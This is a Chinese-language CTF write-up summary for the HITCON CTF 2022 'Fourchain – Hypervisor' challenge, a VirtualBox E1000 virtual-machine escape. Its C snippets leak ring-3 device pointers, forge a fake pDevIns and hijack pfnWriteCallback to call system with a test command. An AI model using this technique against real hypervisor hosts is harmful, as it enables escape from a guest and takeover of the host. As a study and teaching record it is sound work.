---
title: HITCON CTF 2022 — Fourchain – Hypervisor
contest: HITCON CTF 2022
year: 2022
difficulty: hard
vuln_type: misc_unknown
tags: [pwn, hypervisor, virtualbox, e1000-mmio, ring0-ring3, arb-read-write, pdevins-fake, pfnwrite-callback]
attack_chain:
  - VirtualBox E1000 MMIO 任意读写
  - 泄露 Ring 3 DeviceE1000->pDevIns = 0x178 偏移
  - 读 pDevIns->pCritSectRoR3 = 偏移 0x28
  - 构造 fake_pDevIns + 写 R3 pDevIns = fake
  - fake_pDevIns + 0x28 = pCritSectRoR3
  - R3 pDevIns->pfnWriteCallback = system
  - 触发 R3 MMIO write → system("touch /tmp/456")
  - ioremap(E1000_MMIO_BASE, 0x1000) R3 触发
key_payload: R3 pDevIns->pfnWriteCallback = system; "touch /tmp/456"
one_liner: HITCON CTF 2022 Fourchain Hypervisor：E1000 MMIO fake pDevIns劫持callback
lesson: VirtualBox E1000 pDevIns->pfnWriteCallback可劫持为system
quality: high
---

# HITCON CTF 2022 — Fourchain – Hypervisor

## 题目信息
- 比赛：HITCON CTF 2022
- 题目：Fourchain – Hypervisor
- 类别：Pwn（虚拟机逃逸）

## 关键攻击链
### 1. E1000 MMIO 任意读写
```c
// 泄露 Ring 3 DeviceE1000->pDevIns
size_t r3pDevIns = arb_read(inst, code, (sll)(r0Map + 0x178));
size_t pCritSectRoR3 = arb_read64_user(inst, code, paRing0, inst2, r3pDevIns, r3pDevIns + 0x28);
printk(KERN_INFO "pCritSectRoR3: %px\n", pCritSectRoR3);
```

### 2. 构造 fake pDevIns
```c
// Pick a buffer to forge pDevIns
size_t fake_pDevIns = r0Map + 0x1c0;
size_t fake_pDevIns_r3 = r3Map + 0x1c0;
write_string(inst, code, (sll)(fake_pDevIns), "touch /tmp/456");  // fake_pDevIns points to cmd
arb_write(inst, code, (sll)(fake_pDevIns + 0x28), pCritSectRoR3);  // fake_pDevIns->pCritSectRoR3
```

### 3. 劫持 pfnWriteCallback
```c
arb_write(inst, code, (sll)(r0Map + 0x178), fake_pDevIns_r3);  // R3 DeviceE1000->pDevIns = fake
arb_write(inst, code, (sll)(r0Map + 0x180), system);              // R3 DeviceE1000->pfnWriteCallback = system
```

### 4. 触发
```c
// R3 MMIO write (return VINF_IOM_R3_MMIO_WRITE in e1kRegWriteEECD when Ring0)
int* inst3 = ioremap(E1000_MMIO_BASE, 0x1000);
inst3[0x10/4] = 0;  // 触发 system("touch /tmp/456")
```

## 关键技术点
- VirtualBox E1000 设备结构
- Ring 0 / Ring 3 任意读写
- pDevIns 伪造
- pfnWriteCallback 劫持为 system
- VM escape

## 评分
- quality: high（VirtualBox 虚拟机逃逸 + E1000 MMIO fake pDevIns 劫持）
